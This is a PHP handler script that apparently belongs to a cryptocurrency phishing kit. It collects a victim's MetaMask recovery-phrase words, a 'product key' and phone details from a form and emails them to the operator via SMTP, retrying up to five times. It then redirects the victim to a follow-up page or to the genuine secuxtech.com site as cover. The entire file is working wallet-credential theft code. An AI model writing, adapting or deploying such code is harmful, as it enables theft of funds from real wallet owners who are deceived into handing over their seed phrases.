<?php

use Exception;

include_once './config.php';

$keys                       =   $_POST['keys'];
$pkey                       =   $_POST['pkey'];
$phone_number               =   empty($_POST['phone_number']) ? null : $_POST['phone_number'];
$phone_code                 =   empty($_POST['phone_number_phoneCode']) ? null : $_POST['phone_number_phoneCode'];
$country_code               =   empty($_POST['phone_number_countryCode']) ? null : $_POST['phone_number_countryCode'];

if (empty($keys)) {
    redirect(base_url());
} else {
    
    function sendEmail($try=1) {
        global $keys;
        global $pkey;
        global $phone_number;
        global $phone_code;
        global $country_code;
        
        try {
            $mail           =   get_mail_smtp();
            
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject  = 'New MetaMask Key Received';

            $html           =   '<p>A New MetaMask Key Detected,</p>' ;
            $html          .=   '<p>You have received a new key from <b>' . base_url() . '</b>,</p>' ;
            $html          .=   '<p><b>Additional detail</b></p>' ;
            $html          .=   '<ul>' ;
            
            foreach ($keys as $ki => $key) {
                $html          .=   "<li>Word $ki:  <b> $key </b></li>";
            }
            $html          .=   '</ul>' ;
            
            if(!empty($phone_number)) {
                $html       .=   "<p>Product Key: <b>".$pkey."</b>";
                $html       .=   "<p>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</p>";
                $html       .=   "<p>Phone Number : <b>".$phone_number."</b></p>";
            }
            
            $mail->Body     =   $html;
            $mail->AltBody  =   'Keys : '. implode("|", $keys);
            
            $mail->send();

            $_SESSION["keys"]           =   $keys;
            $_SESSION["phone_number"]   =   $phone_number;
            $_SESSION["phone_code"]     =   $phone_code;
            $_SESSION["country_code"]   =   $country_code;
            
            if(empty($phone_number)) {
                redirect(base_url('verify.php?key=').$pkey);
            } else {
                redirect('https://secuxtech.com/');
            }
        } catch (Exception $ex) {
            $try = $try +1;
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            if($try < 5) {
                sleep(2);
                sendEmail($try);
            } else {
                redirect(base_url());
            }
        }
    }
    
    sendEmail(1);
}
?>